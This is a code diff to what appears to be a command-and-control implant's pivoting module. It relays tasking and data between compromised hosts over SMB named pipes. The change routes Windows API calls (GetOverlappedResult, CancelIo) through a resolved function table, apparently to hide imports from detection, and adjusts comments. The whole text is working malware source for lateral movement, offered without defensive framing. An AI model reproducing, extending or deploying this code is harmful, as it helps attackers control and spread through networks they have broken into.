@@ -21,11 +21,11 @@ void Pivotter::PostPivotHeaderRead(PivotData* p)
 
 	DWORD nRead = 0;
 	if (ApiWin->ReadFile(p->Channel, &p->asyncIO->rdHeader, 4, &nRead, &p->asyncIO->ovRead)) {
+
 		ApiWin->SetEvent(p->asyncIO->ovRead.hEvent);
 		p->asyncIO->rdPending = TRUE;
 	}
 	else if (ApiWin->GetLastError() == ERROR_IO_PENDING) {
-
 		p->asyncIO->rdPending = TRUE;
 	}
 
@@ -47,7 +47,7 @@ void Pivotter::LinkPivotSMB(ULONG taskId, ULONG commandId, CHAR* pipename, Packe
 
 		if (ApiWin->GetTickCount() >= startTickCount) {
 			outPacker->Pack32(taskId);
-			outPacker->Pack32(0x1111ffff);			
+			outPacker->Pack32(0x1111ffff);			// COMMAND_ERROR
 			outPacker->Pack32(TEB->LastErrorValue);
 			return;
 		}
@@ -62,13 +62,12 @@ void Pivotter::LinkPivotSMB(ULONG taskId, ULONG commandId, CHAR* pipename, Packe
 			OVERLAPPED ovBeat  = {};
 			ovBeat.hEvent      = hTempEvent;
 
-			// Read 4-byte length header (wait up to 5 seconds)
 			if (!ApiWin->ReadFile(hPipe, &beatLen, 4, &nRead, &ovBeat)) {
 				if (ApiWin->GetLastError() == ERROR_IO_PENDING) {
 					if (ApiWin->WaitForSingleObject(hTempEvent, 5000) == WAIT_OBJECT_0)
-						GetOverlappedResult(hPipe, &ovBeat, &nRead, FALSE);
+						ApiWin->GetOverlappedResult(hPipe, &ovBeat, &nRead, FALSE);
 					else {
-						CancelIo(hPipe);
+						ApiWin->CancelIo(hPipe);
 						nRead = 0;
 					}
 				} else {
@@ -89,7 +88,7 @@ void Pivotter::LinkPivotSMB(ULONG taskId, ULONG commandId, CHAR* pipename, Packe
 					nRead = 0;
 					if (!ApiWin->ReadFile(hPipe, (BYTE*)buffer + idx, beatLen - idx, &nRead, &ovBeat)) {
 						if (ApiWin->GetLastError() == ERROR_IO_PENDING)
-							GetOverlappedResult(hPipe, &ovBeat, &nRead, TRUE);
+							ApiWin->GetOverlappedResult(hPipe, &ovBeat, &nRead, TRUE);
 						else { beatOk = FALSE; break; }
 					}
 					idx += nRead;
@@ -245,7 +244,7 @@ void Pivotter::UnlinkPivot(ULONG taskId, ULONG commandId, ULONG pivotId, Packer*
 			if (pivotData->Type == PIVOT_TYPE_SMB) {
 				if (pivotData->Channel) {
 					if (pivotData->asyncIO && pivotData->asyncIO->rdPending)
-						CancelIo(pivotData->Channel); // cancel the pending overlapped header read
+						ApiWin->CancelIo(pivotData->Channel); // cancel the pending overlapped header read
 					ApiWin->DisconnectNamedPipe(pivotData->Channel);
 					ApiNt->NtClose(pivotData->Channel);
 				}
@@ -283,6 +282,7 @@ void Pivotter::WritePivot(ULONG pivotId, BYTE* data, ULONG size)
 		if (pivotData->Id == pivotId) {
 			if (pivotData->Type == PIVOT_TYPE_SMB) {
 				if (pivotData->Channel && pivotData->asyncIO) {
+
 					OVERLAPPED ovWrite = {};
 					ovWrite.hEvent     = pivotData->asyncIO->hWriteEvent;
 					DWORD nWritten     = 0;
@@ -290,7 +290,7 @@ void Pivotter::WritePivot(ULONG pivotId, BYTE* data, ULONG size)
 					ApiWin->ResetEvent(pivotData->asyncIO->hWriteEvent);
 					if (!ApiWin->WriteFile(pivotData->Channel, &size, 4, &nWritten, &ovWrite)) {
 						if (ApiWin->GetLastError() == ERROR_IO_PENDING)
-							GetOverlappedResult(pivotData->Channel, &ovWrite, &nWritten, TRUE);
+							ApiWin->GetOverlappedResult(pivotData->Channel, &ovWrite, &nWritten, TRUE);
 						else goto _write_done;
 					}
 
@@ -304,12 +304,13 @@ void Pivotter::WritePivot(ULONG pivotId, BYTE* data, ULONG size)
 							ApiWin->ResetEvent(pivotData->asyncIO->hWriteEvent);
 							if (!ApiWin->WriteFile(pivotData->Channel, data + index, chunkSize, &nWritten, &ovWrite)) {
 								if (ApiWin->GetLastError() == ERROR_IO_PENDING)
-									GetOverlappedResult(pivotData->Channel, &ovWrite, &nWritten, TRUE);
+									ApiWin->GetOverlappedResult(pivotData->Channel, &ovWrite, &nWritten, TRUE);
 								else break;
 							}
 							index += nWritten;
 						}
 					}
+
 					this->pendingSMBChildReply  = TRUE;
 					this->lastSMBChildWriteTick = ApiWin->GetTickCount();
 				}
@@ -361,7 +362,7 @@ void Pivotter::ProcessPivots(Packer* packer)
 
 				while (!pivotBroken) {
 					DWORD nRead = 0;
-					if (!GetOverlappedResult(pivotData->Channel, &pivotData->asyncIO->ovRead, &nRead, FALSE)) {
+					if (!ApiWin->GetOverlappedResult(pivotData->Channel, &pivotData->asyncIO->ovRead, &nRead, FALSE)) {
 						if (ApiWin->GetLastError() == ERROR_IO_INCOMPLETE)
 							break; 
 						pivotBroken = TRUE;
@@ -385,7 +386,7 @@ void Pivotter::ProcessPivots(Packer* packer)
 						nRead = 0;
 						if (!ApiWin->ReadFile(pivotData->Channel, (BYTE*)mallocBuffer + idx, msgLen - idx, &nRead, &ovBody)) {
 							if (ApiWin->GetLastError() == ERROR_IO_PENDING)
-								GetOverlappedResult(pivotData->Channel, &ovBody, &nRead, TRUE);
+								ApiWin->GetOverlappedResult(pivotData->Channel, &ovBody, &nRead, TRUE);
 							else { bodyOk = FALSE; break; }
 						}
 						idx += nRead;
@@ -409,12 +410,13 @@ void Pivotter::ProcessPivots(Packer* packer)
 					PostPivotHeaderRead(pivotData);
 					if (!pivotData->asyncIO->rdPending) { pivotBroken = TRUE; break; }
 
+					// If another message is immediately available, drain it in the same pass
 					if (ApiWin->WaitForSingleObject(pivotData->asyncIO->ovRead.hEvent, 0) != WAIT_OBJECT_0)
 						break;
 				}
 
 				if (pivotBroken) {
-					CancelIo(pivotData->Channel);
+					ApiWin->CancelIo(pivotData->Channel);
 					if (pivotData->asyncIO->ovRead.hEvent)  ApiNt->NtClose(pivotData->asyncIO->ovRead.hEvent);
 					if (pivotData->asyncIO->hWriteEvent)    ApiNt->NtClose(pivotData->asyncIO->hWriteEvent);
 					ApiNt->NtClose(pivotData->Channel);
